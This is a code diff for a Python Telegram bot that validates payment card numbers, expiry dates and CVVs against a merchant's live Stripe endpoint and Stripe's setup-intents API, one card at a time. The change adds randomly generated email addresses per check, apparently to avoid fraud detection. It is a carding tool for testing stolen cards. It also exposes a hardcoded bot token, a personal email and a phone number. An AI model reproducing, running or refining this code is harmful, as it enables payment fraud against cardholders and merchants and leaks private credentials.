@@ -2,12 +2,18 @@ import telebot
 import requests
 import time
 import re
+import random
+import string
 
 BOT_TOKEN = "7018443911:AAFP7YgMlc03URuqMUv-_VzysmewC0vt8jM"
 bot = telebot.TeleBot(BOT_TOKEN)
 
 YKARDS_URL = "https://ykards.com/stripe/ZN_createSetup_live.php"
 STRIPE_CONFIRM_URL_BASE = "https://api.stripe.com/v1/setup_intents/"
+
+def generate_random_email():
+    username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
+    return f"{username}@gmail.com"
 
 def parse_card(card_text):
     # Accepts CC|MM|YY|CVV or CC|MM|YYYY|CVV
@@ -20,7 +26,7 @@ def parse_card(card_text):
         yy = yy[2:]
     return cc, mm, yy, cvv
 
-def get_client_secret():
+def get_client_secret(email):
     headers = {
         "content-type": "application/json",
         "accept": "*/*",
@@ -29,7 +35,7 @@ def get_client_secret():
         "user-agent": "Mozilla/5.0"
     }
     payload = {
-        "email": "peshangsalam2002@gmail.com",
+        "email": email,
         "name": "John Doe",
         "phone": "3144740104",
         "url": "https://ykards.com/checkout/",
@@ -44,7 +50,7 @@ def get_client_secret():
         resp = requests.post(YKARDS_URL, headers=headers, json=payload, timeout=30)
         data = resp.json()
         return data.get("clientSecret")
-    except Exception as e:
+    except Exception:
         return None
 
 def check_card(cc, mm, yy, cvv, client_secret):
@@ -125,7 +131,8 @@ def card_handler(message):
             bot.send_message(message.chat.id, f"❌ Invalid format: {card_text}")
             continue
         cc, mm, yy, cvv = parsed
-        client_secret = get_client_secret()
+        email = generate_random_email()
+        client_secret = get_client_secret(email)
         result = check_card(cc, mm, yy, cvv, client_secret)
         bot.send_message(message.chat.id, result)
         time.sleep(10)
